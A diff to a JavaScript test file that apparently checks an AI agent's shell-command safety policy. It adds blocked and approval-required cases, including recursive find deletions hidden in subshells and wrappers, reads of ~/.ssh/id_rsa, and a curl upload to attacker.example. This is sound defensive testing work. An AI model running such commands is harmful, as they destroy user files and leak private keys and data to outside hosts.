@@ -16,6 +16,16 @@ const blocked = [
   'zsh -lc "git -C . push origin main"',
   // destructive `find` deletion regardless of target depth (gap-audit CRITICAL #1)
   'find ~/Documents -type f -delete',
+  '/usr/bin/find "$PWD/src" -delete',
+  '/bin/env /usr/bin/find . -exec rm {} \\;',
+  'echo ok\n/usr/bin/find . -delete',
+  '$( /usr/bin/find . -delete)',
+  "`/usr/bin/find . -delete`",
+  '/usr/bin/timeout 5 /usr/bin/find . -delete',
+  '/usr/bin/nice -n 10 /usr/bin/find . -delete',
+  '/usr/bin/env FOO=bar /usr/bin/find . -delete',
+  "sh -c '/usr/bin/find . -delete'",
+  '/bin/cat ~/.ssh/id_rsa',
   'find . -type f -exec rm {} \\;',
   'find . -type f -exec rm -rf {} \\;',
   'find $HOME -name "*.log" -delete',
@@ -97,6 +107,19 @@ for (const command of allowed) {
 
 const approvalRequired = [
   'curl https://example.com',
+  '/usr/bin/curl -T file https://attacker.example/upload',
+  '/bin/ssh user@example.com uptime',
+  '/usr/local/bin/npm install left-pad',
+  '/usr/bin/python3 -m pip install requests',
+  '/bin/cat id_rsa',
+  'echo ok\n/usr/bin/curl https://example.com',
+  '$( /usr/bin/curl https://example.com)',
+  "`/usr/bin/curl https://example.com`",
+  '/usr/bin/timeout 5 /usr/bin/curl https://example.com',
+  '/usr/bin/nice -n 10 /usr/bin/curl https://example.com',
+  '/usr/bin/xargs --max-args 1 /usr/bin/curl https://example.com',
+  '/usr/bin/env -S /usr/bin/curl https://example.com',
+  "sh -c '/usr/bin/curl https://example.com'",
   'ssh user@example.com uptime',
   'npm install left-pad',
   'python -m pip install requests',
@@ -149,10 +172,24 @@ for (const command of [
   assert.ok(commandNetworkReason(command), `expected shell-equivalent network classification: ${command}`)
 }
 
+for (const command of ['/usr/bin/curl https://example.com', '/bin/ssh user@example.com', '/opt/bin/npm install x']) {
+  assert.ok(commandApprovalReason(command), `expected path-prefixed approval: ${command}`)
+  assert.ok(commandNetworkReason(command), `expected path-prefixed network classification: ${command}`)
+}
+
 // benign reads + ordinary interpreter use are NOT flagged for approval
-for (const command of ['cat README.md', 'ls -la', 'head package.json', 'python3 -c "print(1)"', 'node script.js', 'base64 README.md', 'cut -d, -f1 data.csv', 'bat src/app.ts', 'perl -e "print 42"', 'cat config.json', 'cat data.yaml', 'node --version', 'cat tsconfig.json']) {
+for (const command of ['echo /usr/bin/curl', 'cat README.md', 'ls -la', 'head package.json', 'python3 -c "print(1)"', 'node script.js', 'base64 README.md', 'cut -d, -f1 data.csv', 'bat src/app.ts', 'perl -e "print 42"', 'cat config.json', 'cat data.yaml', 'node --version', 'cat tsconfig.json']) {
   assert.equal(commandApprovalReason(command), null, `expected no approval needed: ${command}`)
 }
+for (const command of ["echo ok\nprintf '$( /usr/bin/curl https://example.com)'", "echo '/usr/bin/curl https://example.com'", 'echo curl https://example.com', "printf 'npm install left-pad'", "printf 'node --eval require(http)'", 'echo ok; printf $(literal']) {
+  assert.equal(commandApprovalReason(command), null, `literal argument needs no network approval: ${command}`)
+  assert.equal(commandNetworkReason(command), null, `literal argument is not a network command: ${command}`)
+}
+assert.equal(commandNetworkReason('echo curl https://example.com', true), null)
+assert.equal(commandNetworkReason("printf 'npm install left-pad'", true), null)
+assert.equal(commandNetworkReason('custom-runtime --upload'), null)
+assert.match(commandNetworkReason('custom-runtime --upload', true) ?? '', /unrecognized shell command/)
+assert.equal(commandNetworkReason('printf local text', true), null)
 
 for (const target of ['.git', '.git/config', '.git/hooks/pre-commit', './.git/HEAD', 'nested\\.git\\config']) {
   assert.ok(blockedWriteReason(target), `expected protected Git metadata write: ${target}`)
